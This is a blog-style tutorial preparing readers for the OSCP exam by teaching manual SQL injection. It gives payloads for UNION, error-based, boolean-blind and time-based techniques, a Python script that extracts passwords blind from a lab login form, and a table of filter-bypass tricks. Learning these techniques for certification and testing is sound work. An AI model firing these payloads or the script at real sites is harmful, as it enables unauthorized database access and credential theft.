---
title: Manual SQL Injection: Beyond sqlmap
date: 2024-12-08
tags: [Web Security, SQL Injection, OSCP]
thumbnail:
---

## Why Manual SQLi Matters

`sqlmap` is banned in OSCP. More importantly — if you can't do it manually, you don't actually understand the vulnerability. This post covers all four major SQLi techniques with real payloads you can adapt.

---

## Reconnaissance: Is It Injectable?

Before anything, confirm the injection point:

```sql
-- Boolean-based test
' OR '1'='1
' OR '1'='2

-- Error-based test (MySQL)
'
''
`
```

If you get different responses or database errors — you're in.

---

## Technique 1: UNION-Based

UNION attacks let you extract data by appending your own SELECT statement.

**Step 1: Find column count**

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   -- Error? You have 2 columns
```

**Step 2: Find printable columns**

```sql
' UNION SELECT NULL,NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL,'a'--
```

**Step 3: Extract data**

```sql
-- Database version
' UNION SELECT @@version,NULL--

-- List tables (MySQL)
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--

-- Extract credentials
' UNION SELECT username,password FROM users--
```

---

## Technique 2: Error-Based

Force database errors that leak data in the error message.

```sql
-- MySQL ExtractValue trick
' AND ExtractValue(1,concat(0x7e,version()))--

-- Output: XPATH syntax error: '~8.0.32-Ubuntu'

-- MSSQL conversion error
' AND 1=CONVERT(int,(SELECT TOP 1 username FROM users))--
```

---

## Technique 3: Boolean-Based Blind

No visible output — infer truth from different application responses.

```sql
-- Is first char of password 'a'?
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

-- Binary search approach (more efficient)
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>96--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>112--
```

Automate this with a Python script — it's still "manual" since you wrote it:

```python
import requests

TARGET = "http://target.htb/login"
CHARS = "abcdefghijklmnopqrstuvwxyz0123456789!@#$"

def extract_char(pos):
    for c in CHARS:
        payload = f"' AND SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1)='{c}'--"
        r = requests.post(TARGET, data={"user": payload, "pass": "x"})
        if "Welcome" in r.text:   # True condition indicator
            return c
    return "?"

password = ""
for i in range(1, 33):
    password += extract_char(i)
    print(f"\rExtracting: {password}", end="")
print()
```

---

## Technique 4: Time-Based Blind

No visible output, no different HTTP responses — use timing delays.

```sql
-- MySQL
' AND SLEEP(5)--

-- MSSQL  
'; WAITFOR DELAY '0:0:5'--

-- PostgreSQL
'; SELECT pg_sleep(5)--

-- Conditional timing
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(password,1,1)='a',SLEEP(5),0)--
```

---

## Filter Bypass Cheatsheet

| Filter | Bypass |
|---|---|
| `SELECT` filtered | `SeLeCt`, `SEL/**/ECT` |
| Spaces blocked | `/**/`, `%09` (tab), `%0a` (newline) |
| `OR` filtered | `||`, `OR/**/1` |
| Quotes escaped | Hex encoding: `0x61646d696e` = `admin` |
| `--` comment blocked | `#`, `/*comment*/` |

---

## OSCP Tips

1. Always check all parameters — cookies, headers, JSON body
2. Test both `GET` and `POST` requests
3. Time delays > 1s are suspicious even without sleep — check for application-level delays
4. SQLi in login forms often bypasses auth even without reading the DB

---

Methodology > Tools. Always.
